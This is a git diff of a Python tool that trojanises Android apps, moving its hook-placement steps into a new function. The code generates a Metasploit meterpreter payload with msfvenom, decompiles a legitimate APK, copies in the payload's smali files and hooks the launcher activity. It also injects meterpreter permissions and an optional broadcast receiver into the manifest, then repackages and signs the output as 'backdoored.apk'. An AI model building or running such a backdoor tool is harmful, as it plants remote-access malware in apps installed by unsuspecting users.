@@ -9,8 +9,8 @@ import time
 import xml.etree.ElementTree as ET
 
 from apkhandling import builder
-from manifestmanager import manifest_analyzer, manifest_manager
-from hookmanager import main_hook
+from manifestmanager import manifest_analyzer, manifest_changer
+from hookmanager import main_hook, broadcast_hook
 
 # tasks:
 # - write/include argument parser
@@ -114,8 +114,8 @@ def run_jarsigner(command):
     full_command = "jarsigner " + command
     proc = subprocess.Popen(full_command, stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
-    print out
-    print err
+    #print out
+    #print err
 
 def check_requirements():
     """
@@ -142,7 +142,34 @@ def check_requirements():
         print "Please specify the path to the original apk with the -o parameter"
         sys.exit(1)
 
+def place_hooks():
+    global args
+    # hook in Main activity
+    # read the manifest to xml model
+    #print "Reading android manifest"
+    launcher_activity = manifest_analyzer.find_launcher_activity('original/_decompiled/AndroidManifest.xml')
+    print "[*] Launcheractivity: {} ".format(launcher_activity[0])
 
+    smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity[0].replace(".", "/"))
+
+
+    hookedsmali = main_hook.generate_hooked_smali(smali_file)
+    print "[*] Loading ", smali_file, " and injecting payload..\n"
+
+    with open(smali_file, "w") as f:
+        f.write("\n".join(hookedsmali))
+
+    print "[*] Poisoning the manifest with meterpreter permissions..\n"
+    payload_manifest = "payload/_decompiled/AndroidManifest.xml"
+    original_manifest = "original/_decompiled/AndroidManifest.xml"
+    manifest_changer.fix_manifest(payload_manifest, original_manifest, original_manifest)
+
+
+    # Broadcast hook
+    if args['broadcast_hook']:
+        # TODO make paths dynamic
+        broadcast_hook.inject_broadcast_hook("original/_decompiled/AndroidManifest.xml", "original/_decompiled/smali/com/metasploit/stage/","com/metasploit/stage/" ,True, True, True)
+        pass
 
 def main():
     global args
@@ -153,12 +180,8 @@ def main():
     check_requirements()
 
     print "[*] Generating msfvenom payload..\n"
-#    print "Metasploit command: msfvenom -f raw {} -o payload.apk 2>&1\n" \
-#        .format(args['meterpreter_arguments'])
-
     command = "msfvenom " + args['meterpreter_arguments'] + " 2>&1"
     print str(command)
-
     generate_meterpreter(command)
 
     print "[*] Signing payload..\n"
@@ -174,26 +197,6 @@ def main():
     builder.decompileApk("original.apk")
     print "[*] Decompiling payload APK..\n"
     builder.decompileApk("payload.apk")
-    #_____________________________________________________________________________________________#
-    # TODO Moritz: Structure this section; Include other hooks
-    # Steps:
-    # 1. find launcher activity
-    # 2. copy smali files from payload to original
-    # 3. place hook in launcher activity with smali_converter.generate_hooked_smali(smali_file)
-    # 4. fix the manifest
-    # 5. Inject broadcast receiver as smali file
-    # 6. fix the manifest: add permissions; add receiver
-
-    # read the manifest to xml model
-    print "Reading android manifest"
-
-    launcher_activity = manifest_analyzer.find_launcher_activity('original/_decompiled/AndroidManifest.xml')
-    print "[*] Launcheractivity: {} ".format(launcher_activity[0])
-
-    smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity[0].replace(".", "/"))
-
-    print smali_file
-    time.sleep(10)
 
     # TODO make path dynamic
     print "[*] Copying payload files..\n"
@@ -201,27 +204,18 @@ def main():
     os.system('cp payload/_decompiled/smali/com/metasploit/stage/*.smali '
               'original/_decompiled/smali/com/metasploit/stage/')
 
-    hookedsmali = main_hook.generate_hooked_smali(smali_file)
-    print "[*] Loading ", smali_file, " and injecting payload..\n"
+    place_hooks()
 
-    with open(smali_file, "w") as f:
-        f.write("\n".join(hookedsmali))
     injected_apk = "backdoored.apk"
 
-    print "[*] Poisoning the manifest with meterpreter permissions..\n"
-    payload_manifest = "payload/_decompiled/AndroidManifest.xml"
-    original_manifest = "original/_decompiled/AndroidManifest.xml"
-    manifest_manager.fix_manifest(payload_manifest, original_manifest, original_manifest)
-
     print "[*] Rebuilding"
-
     builder.repackApk("original/_decompiled/")
-    print "[*] Signing"
 
-    #_____________________________________________________________________________________________#
+    print "[*] Signing"
     run_jarsigner(
         "-verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg "
         "MD5withRSA " + injected_apk + " androiddebugkey")
+
     if args['clean']:
         # clean up
         print "[*] Clean up intermediate states\n"
